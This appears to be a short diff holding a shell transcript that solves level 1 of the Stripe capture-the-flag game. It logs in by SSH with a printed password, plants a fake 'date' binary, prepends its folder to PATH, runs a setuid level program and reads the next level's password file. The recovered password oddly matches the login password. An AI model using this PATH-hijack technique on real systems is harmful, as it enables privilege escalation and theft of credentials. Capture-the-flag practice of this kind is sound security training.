@@ -1,0 +1,12 @@
+$ ssh level01@ctf.stri.pe
+	Password: e9gx26YEb2
+
+$ mkdir /tmp/hacks
+$ vi /tmp/hacks/date.c
+$ gcc /tmp/hacks/date.c -o /tmp/hacks/date
+$ PATH=/tmp/hacks:$PATH
+
+$ /levels/level01
+
+$ cat /home/level02/.password
+	e9gx26YEb2
